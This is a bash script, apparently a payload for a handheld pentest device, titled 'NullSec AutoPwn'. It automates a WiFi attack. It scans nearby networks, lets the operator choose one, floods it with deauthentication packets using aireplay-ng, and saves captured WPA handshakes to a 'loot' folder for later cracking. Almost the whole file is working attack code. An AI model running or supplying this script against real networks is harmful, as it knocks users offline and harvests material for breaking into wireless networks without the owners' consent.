#!/bin/bash
# Title: NullSec AutoPwn
# Author: bad-antics
# Description: Automated WiFi attack - scans, selects targets, captures
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
LOG_FILE="$LOOT_DIR/logs/autopwn_$(date +%Y%m%d_%H%M%S).log"

mkdir -p "$LOOT_DIR"/{handshakes,creds,probes,pmkid,logs}

# Logging function
log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG_FILE"; LOG "$1"; }

# --- INTRODUCTION ---
PROMPT "NULLSEC AUTO-PWN

Automated WiFi attack chain:
- Network scanning
- Target selection  
- Handshake capture
- PMKID harvesting

Press OK to start scan."

# --- DETECT INTERFACES ---
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    if [ -d "/sys/class/net/$iface" ]; then
        MONITOR_IF="$iface"
        break
    fi
done

if [ -z "$MONITOR_IF" ]; then
    # Try to create monitor mode
    for iface in wlan1 wlan2; do
        if [ -d "/sys/class/net/$iface" ]; then
            airmon-ng start $iface 2>/dev/null
            MONITOR_IF="${iface}mon"
            [ -d "/sys/class/net/$MONITOR_IF" ] && break
        fi
    done
fi

if [ -z "$MONITOR_IF" ] || [ ! -d "/sys/class/net/$MONITOR_IF" ]; then
    ERROR_DIALOG "No monitor interface found!

Enable monitor mode first:
airmon-ng start wlan1"
    exit 1
fi

log "Using interface: $MONITOR_IF"

# --- SCAN FOR NETWORKS ---
LOG "Scanning for networks..."
SPINNER_START "Scanning WiFi networks..."

rm -f /tmp/autopwn_scan*
timeout 20 airodump-ng "$MONITOR_IF" -w /tmp/autopwn_scan --output-format csv 2>/dev/null &
SCAN_PID=$!
sleep 20
kill $SCAN_PID 2>/dev/null
killall airodump-ng 2>/dev/null

SPINNER_STOP

# Parse networks into arrays
declare -a BSSIDS CHANNELS ESSIDS POWERS
idx=0

while IFS=',' read -r bssid first last channel speed priv cipher auth power beacons iv lan id essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    
    essid=$(echo "$essid" | tr -d ' ' | head -c 20)
    [ -z "$essid" ] && essid="[Hidden]"
    channel=$(echo "$channel" | tr -d ' ')
    power=$(echo "$power" | tr -d ' ')
    
    BSSIDS[$idx]="$bssid"
    CHANNELS[$idx]="$channel"
    ESSIDS[$idx]="$essid"
    POWERS[$idx]="$power"
    
    idx=$((idx + 1))
    [ $idx -ge 15 ] && break
done < /tmp/autopwn_scan-01.csv

if [ $idx -eq 0 ]; then
    ERROR_DIALOG "No networks found!

Try moving to different location
or check monitor interface."
    exit 1
fi

# --- SELECT TARGET ---
NETWORK_LIST="Found $idx networks:

"
for i in $(seq 0 $((idx-1))); do
    NETWORK_LIST="${NETWORK_LIST}$((i+1)). ${ESSIDS[$i]} (${POWERS[$i]}dBm)
"
done

TARGET_NUM=$(NUMBER_PICKER "Select target (1-$idx):" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;;
esac

# Validate selection
TARGET_NUM=$((TARGET_NUM - 1))
[ $TARGET_NUM -lt 0 ] && TARGET_NUM=0
[ $TARGET_NUM -ge $idx ] && TARGET_NUM=$((idx - 1))

TARGET_BSSID="${BSSIDS[$TARGET_NUM]}"
TARGET_CHANNEL="${CHANNELS[$TARGET_NUM]}"
TARGET_ESSID="${ESSIDS[$TARGET_NUM]}"

log "Selected target: $TARGET_ESSID ($TARGET_BSSID) CH:$TARGET_CHANNEL"

# --- SELECT DURATION ---
DURATION=$(NUMBER_PICKER "Capture duration (seconds):" 60)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;;
esac
[ $DURATION -lt 10 ] && DURATION=10
[ $DURATION -gt 300 ] && DURATION=300

# --- CONFIRM ATTACK ---
resp=$(CONFIRMATION_DIALOG "Attack $TARGET_ESSID?

BSSID: $TARGET_BSSID
Channel: $TARGET_CHANNEL
Duration: ${DURATION}s

Select YES to attack.")

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "Attack cancelled"
    exit 0
fi

# --- EXECUTE ATTACK ---
LOG "Starting attack on $TARGET_ESSID"

CAPTURE_FILE="$LOOT_DIR/handshakes/${TARGET_ESSID}_$(date +%Y%m%d_%H%M%S)"

# Set channel
iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null

# Start capture
airodump-ng "$MONITOR_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
    -w "$CAPTURE_FILE" --output-format pcap 2>/dev/null &
CAPTURE_PID=$!

sleep 3

# Deauth bursts
LOG "Sending deauth packets..."
DEAUTH_COUNT=0
START=$(date +%s)

while [ $(($(date +%s) - START)) -lt $DURATION ]; do
    aireplay-ng -0 5 -a "$TARGET_BSSID" "$MONITOR_IF" 2>/dev/null
    DEAUTH_COUNT=$((DEAUTH_COUNT + 5))
    sleep 5
    
    # Check for handshake
    if [ -f "${CAPTURE_FILE}-01.cap" ]; then
        if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            LOG "HANDSHAKE CAPTURED!"
            ALERT "Handshake captured for $TARGET_ESSID!"
            break
        fi
    fi
done

# Cleanup
kill $CAPTURE_PID 2>/dev/null
killall airodump-ng aireplay-ng 2>/dev/null

# --- RESULTS ---
HS_FOUND="No"
if [ -f "${CAPTURE_FILE}-01.cap" ]; then
    if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
        HS_FOUND="YES!"
    fi
fi

PROMPT "ATTACK COMPLETE

Target: $TARGET_ESSID
Deauths sent: $DEAUTH_COUNT
Handshake: $HS_FOUND

Capture saved to:
$CAPTURE_FILE

Press OK to exit."

log "Attack complete. Handshake: $HS_FOUND"
